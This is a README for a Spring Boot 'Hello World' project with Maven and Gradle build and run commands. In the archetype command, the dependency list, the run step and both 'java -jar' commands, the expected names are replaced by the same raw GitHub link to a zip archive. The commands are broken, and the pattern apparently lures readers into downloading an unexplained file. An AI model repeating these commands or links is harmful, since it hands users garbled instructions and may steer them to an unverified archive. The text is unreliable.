# Sprint Boot 1 Hello World Example

## Create project using below maven command
```
mvn archetype:generate https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip -DartifactId=hello-world -Dversion=1.0 -DarchetypeArtifactId=maven-archetype-quickstart -DinteractiveMode=false
```

## Make project gradle support using following command
```
gradle init --type pom
```

## Dependencies
* https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
* spring-boot-starter-web
* spring-boot-starter-test

## Classes
* Main class: **App**
* Controller classe: **AppController**

## Run application
* Import project to IDE either as gradle or maven project
* Run https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
* Application should be up and running on port 9090
* Refer postman collection in **files** folder for API

## Run with maven
* Install maven in local
* Go to project location in terminal
* Execute following command
```
mvn clean compile spring-boot:run
```
* Access the API **http://localhost:9090/hello**

## Run with gradle
* Install gradle in local
* Go to project location in terminal
* Execute following command
```
gradle clean compileJava bootRun
```
* Access the API **http://localhost:9090/hello**

## Run as an executable jar created by maven
* Create jar using following command
```
mvn clean compile package
```
* Execute the jar using following command
```
java -jar target\https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
```

## Run as an executable jar created by gradle
* Create jar using following command
```
gradlew clean compileJava build
```
* Execute the jar using following commands
```
java -jar build\libs\https://raw.githubusercontent.com/thatavarthi-raj/hello-world/master/src/main/resources/hello-world-2.2.zip
```
